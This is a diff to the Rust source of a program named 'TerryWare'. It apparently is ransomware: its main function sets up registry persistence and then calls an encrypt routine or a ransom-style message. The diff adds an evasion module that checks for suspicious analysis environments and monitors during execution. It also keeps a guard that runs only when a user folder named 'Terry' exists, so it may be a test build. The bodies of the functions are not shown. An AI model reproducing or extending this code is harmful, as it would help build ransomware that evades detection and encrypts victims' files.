@@ -8,27 +8,49 @@ use winreg::RegKey;
 use sha2::{Sha256, Digest};
 use rand::Rng;
 use libaes::Cipher; 
+mod evasion;
+use crate::evasion::run_evasion_checks;
+use crate::evasion::EvasionCheck;
+use colored::*;
 
 fn main() {
-    if !Path::new("C:\\Users\\Terry").exists() {
-        println!("Error: User 'Terry' not found.\nExiting...");
-        let mut input = String::new();
-        io::stdin().read_line(&mut input).unwrap();
-        exit(0);
+    println!("{} Starting TerryWare...", "[+]".green());
+    if !run_evasion_checks() {
+        println!("{} WARNING: Suspicious environment detected.", "[!]".yellow());
+    }
+    
+    let monitor = EvasionCheck::start_monitoring();
+    
+    let result = if !Path::new("C:\\Users\\Terry").exists() {
+        println!("{} Error: User 'Terry' not found.\n    Exiting...", "[!]".red());
+        exit(1);
     } else {
         match persistence() {
             Ok(0) => {
                 println!("Persistence established.");
-                encrypt();
+                Ok(Box::new(encrypt) as Box<dyn Fn()>)
             },
-            Ok(1) => {
-                message();
-            },
+            Ok(1) => Ok(Box::new(message) as Box<dyn Fn()>),
             Err(e) => {
                 eprintln!("Failed to set up persistence: {}", e);
-                exit(1);
+                Err("Persistence failed")
             },
-            _ => println!("An unknown error occurred."),
+            _ => Err("Unknown error"),
+        }
+    };
+
+    let monitoring_stopped = EvasionCheck::stop_monitoring(monitor);
+    
+    if !monitoring_stopped {
+        exit(1);
+    }
+
+    match result {
+        Ok(f) => f(),
+        Err(_) => {
+            let mut input = String::new();
+            io::stdin().read_line(&mut input).unwrap();
+            exit(1);
         }
     }
 }
